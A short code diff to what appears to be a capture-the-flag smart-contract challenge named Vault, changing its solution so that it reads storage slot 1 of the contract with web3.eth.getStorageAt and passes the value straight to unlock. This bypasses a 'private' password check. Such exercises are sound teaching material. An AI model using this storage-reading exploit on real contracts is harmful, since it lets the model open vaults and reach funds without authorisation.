@@ -22,6 +22,6 @@ contract Vault {
 
 //solution
 
-web3.eth.getStorageAt(instanceAddress, 1, function(err, res) {
-    console.log('password: '+res);
+await web3.eth.getStorageAt(instance, 1, function(err, res) {
+  contract.unlock(res);
 });
